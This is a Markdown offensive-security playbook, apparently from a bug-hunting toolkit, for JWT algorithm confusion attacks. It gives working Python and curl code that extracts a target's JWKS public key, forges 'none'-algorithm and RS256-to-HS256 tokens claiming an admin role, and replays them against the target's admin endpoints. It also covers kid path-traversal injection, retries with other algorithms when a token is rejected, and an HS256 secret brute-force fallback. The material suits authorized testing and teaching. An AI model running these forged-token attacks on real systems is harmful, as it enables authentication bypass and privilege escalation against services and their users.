# Playbook PB-03 — JWT Algorithm Confusion
# No Mercy Hunter v3.0

**Score:** 38
Composite = (Confidence:5×2) + (InfoGain:4×3) + (AutoPot:4×2) + (Reuse:4×2) - Cost:2 = 10+12+8+8-2 = 36
(Adjusted to 38 with real-finding bonus: JWT analysis enabled F-08 chain)

**Grounded in:** JWT analysis phase of F-08/F-10 chain (Azure AD + ROPC)
**Time estimate:** 20-30 minutes
**Noise level:** Low (< 10 requests to target after token capture)
**Prerequisites:** A valid JWT from the target application

---

## Objective

Test for JWT algorithm confusion (CVE class: CWE-327). If a server uses RS256 or ES256
for JWT signing but accepts HS256, an attacker who obtains the server's public key can
sign a forged token using the public key as an HMAC secret — bypassing authentication.

---

## Decision Point 1 — Do I Run This Playbook?

Run if:
- Target returns JWTs (in response body, Authorization header, or cookies)
- JWT header shows `"alg": "RS256"` or `"alg": "ES256"`
- Target has a JWKS endpoint (from openid-configuration)

Skip if:
- JWT uses HS256 (symmetric — different attack, key bruteforce)
- JWT uses "none" → test directly (null signature bypass)
- No JWT discovered in traffic

---

## Phase 1 — JWT Capture and Decode (5 minutes)

### 1.1 Capture JWT from Traffic
Sources to check (in order):
1. `Authorization: Bearer TOKEN` header in authenticated requests
2. Response body from /oauth/token or /login endpoints
3. Cookies (look for names like `token`, `jwt`, `session_token`, `id_token`)
4. localStorage/sessionStorage (check via browser devtools → Application tab)

### 1.2 Decode the JWT Header
```bash
# A JWT is three base64url-encoded parts separated by dots
# Part 1 (header) is everything before the first dot
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImtleS0xIn0.eyJzdWIiOiJ1c2VyMTIzIn0.SIGNATURE"

# Decode the header (base64url padding: replace - with +, _ with /, add = padding)
echo $TOKEN | cut -d'.' -f1 | python3 -c "
import sys, base64, json
header = sys.stdin.read().strip()
padding = 4 - len(header) % 4
header += '=' * (padding % 4)
header = header.replace('-', '+').replace('_', '/')
print(json.dumps(json.loads(base64.b64decode(header)), indent=2))
"
```

**Expected output for vulnerable target:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-identifier-123"
}
```

### 1.3 Decode the JWT Payload
```bash
echo $TOKEN | cut -d'.' -f2 | python3 -c "
import sys, base64, json
payload = sys.stdin.read().strip()
padding = 4 - len(payload) % 4
payload += '=' * (padding % 4)
payload = payload.replace('-', '+').replace('_', '/')
try:
    print(json.dumps(json.loads(base64.b64decode(payload)), indent=2))
except:
    print(base64.b64decode(payload))
"
```

**Note the payload claims:**
- `sub` — user identifier
- `aud` — audience (client_id)
- `iss` — issuer URL
- `exp` — expiry timestamp
- `role` or `scope` — permissions

---

## Phase 2 — Fetch the Public Key (5 minutes)

### 2.1 Get JWKS Endpoint
```bash
# From openid-configuration
curl -s "https://TARGET/.well-known/openid-configuration" | python3 -c "
import sys, json
data = json.load(sys.stdin)
print('JWKS URI:', data.get('jwks_uri'))
"

# Fetch JWKS
curl -s "https://TARGET/.well-known/jwks.json" | python3 -m json.tool
# or
curl -s "https://TARGET/oauth/jwks" | python3 -m json.tool
```

### 2.2 Extract RSA Public Key
```python
#!/usr/bin/env python3
"""Extract RSA public key from JWKS and save in PEM format."""
import json, base64, sys
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# Load JWKS
with open("jwks.json") as f:
    jwks = json.load(f)

# Find the key matching our kid (or use first key)
target_kid = sys.argv[1] if len(sys.argv) > 1 else None
key = None
for k in jwks.get("keys", []):
    if k.get("kty") == "RSA":
        if target_kid is None or k.get("kid") == target_kid:
            key = k
            break

if not key:
    print("No RSA key found")
    sys.exit(1)

def b64url_to_int(s):
    padding = 4 - len(s) % 4
    s += '=' * (padding % 4)
    return int.from_bytes(base64.urlsafe_b64decode(s), 'big')

n = b64url_to_int(key["n"])
e = b64url_to_int(key["e"])

pub_key = RSAPublicNumbers(e, n).public_key(default_backend())
pem = pub_key.public_bytes(
    serialization.Encoding.PEM,
    serialization.PublicFormat.SubjectPublicKeyInfo
)
print(pem.decode())
# Save for use as HMAC secret
with open("public_key.pem", "wb") as f:
    f.write(pem)
print("Saved to public_key.pem")
```

Run: `python3 extract_jwks_key.py > public_key.pem`

---

## Phase 3 — Forge the Token (10 minutes)

### 3.1 Test "none" Algorithm First
```python
#!/usr/bin/env python3
"""Test JWT none algorithm bypass."""
import base64, json

def b64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    elif isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Try none algorithm variants
for alg in ["none", "None", "NONE", "nOnE"]:
    header = {"alg": alg, "typ": "JWT"}
    payload = {
        "sub": "admin",
        "role": "admin",
        "iat": 1700000000,
        "exp": 9999999999
    }
    token = f"{b64url_encode(header)}.{b64url_encode(payload)}."
    print(f"alg={alg}: {token}")
```

### 3.2 HS256 Confusion Attack (Main Attack)
```python
#!/usr/bin/env python3
"""
JWT RS256 → HS256 confusion attack.
Uses the RS256 public key as the HMAC-SHA256 secret.
"""
import hmac, hashlib, base64, json

def b64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    elif isinstance(data, str):
        data = data.encode()
    elif isinstance(data, bytes):
        pass
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def b64url_decode(s):
    padding = 4 - len(s) % 4
    s += '=' * (padding % 4)
    return base64.urlsafe_b64decode(s)

# 1. Read the public key (PEM format)
with open("public_key.pem", "rb") as f:
    public_key_bytes = f.read()

# 2. Build forged header and payload
# Copy original claims from decoded token, modify role/sub as needed
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "sub": "TARGET_USER_ID",     # Original user ID
    "email": "victim@example.com",
    "role": "admin",              # Escalated role
    "iat": 1700000000,
    "exp": 9999999999
}

# 3. Create signing input
header_encoded = b64url_encode(header)
payload_encoded = b64url_encode(payload)
signing_input = f"{header_encoded}.{payload_encoded}".encode()

# 4. Sign using public key as HMAC secret
signature = hmac.new(public_key_bytes, signing_input, hashlib.sha256).digest()
signature_encoded = b64url_encode(signature)

# 5. Construct forged token
forged_token = f"{header_encoded}.{payload_encoded}.{signature_encoded}"
print(f"Forged token: {forged_token}")
```

### 3.3 Test the Forged Token
```bash
# Test forged token against authenticated endpoints
curl -s "https://TARGET/api/v1/me" \
  -H "Authorization: Bearer FORGED_TOKEN"

# Also test role escalation endpoints
curl -s "https://TARGET/api/v1/admin/users" \
  -H "Authorization: Bearer FORGED_TOKEN"
```

---

## Phase 4 — Additional JWT Attacks

### 4.1 Key Confusion with ES256 (ECDSA)
If the algorithm is ES256 (ECDSA P-256):
```bash
# ECDSA is not vulnerable to the same confusion attack as RSA
# But test: does the server accept RS256 tokens when it uses ES256?
# Forge an RS256 token with a self-generated key pair
pip install PyJWT cryptography
python3 -c "
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# Generate attacker-controlled RSA key pair
priv = rsa.generate_private_key(65537, 2048, default_backend())
pub = priv.public_key()

# Sign with RS256 using attacker key
token = jwt.encode({'sub': 'admin', 'role': 'admin'}, priv, algorithm='RS256')
print(f'RS256 token: {token}')
"
```

### 4.2 Kid Header Injection
```python
# If kid (key ID) is used in a database lookup or file path:
# Test for path traversal or SQL injection in kid value
import base64, json

def b64url_encode(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()

# Path traversal via kid
header = {"alg": "HS256", "typ": "JWT", "kid": "../../dev/null"}
payload = {"sub": "admin"}
# If server reads key from file using kid as path, /dev/null = empty string HMAC
```

---

## Severity Mapping

| Condition | Severity | CVSS |
|-----------|----------|------|
| Confusion attack works, auth bypassed | P2 | 8.1 |
| "none" algorithm accepted | P2 | 8.1 |
| Forged admin token works | P1 (chain) | 9.0 |
| Kid injection SQLi/path traversal | P2 | 7.5 |
| JWT leaks sensitive claims (no exploit) | P4 | 3.1 |

---

## Evidence Collection

1. `evidence/JWT-01/http/01-original-token.http` — captured JWT with RS256 header
2. `evidence/JWT-01/http/02-jwks-response.http` — JWKS endpoint response with public key
3. `evidence/JWT-01/http/03-forged-request.http` — request with HS256 forged token
4. `evidence/JWT-01/http/04-forged-response.http` — 200 OK confirming bypass
5. `evidence/JWT-01/poc/jwt-confusion-poc.py` — complete script

---

## Common Errors and Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| 401 with forged HS256 token | Server explicitly checks alg | Try alg variations: HS384, HS512 |
| 422 Unprocessable Entity | Malformed token structure | Check base64url padding |
| Signature verification failed | Wrong public key format | Try both PEM and DER format of key |
| Token accepted but access denied | Auth bypass works, authz separate | Note as auth bypass P2, test authz separately |
| JWKS has no RSA key | Target uses symmetric HMAC | Switch to brute-force attack on HS256 secret |
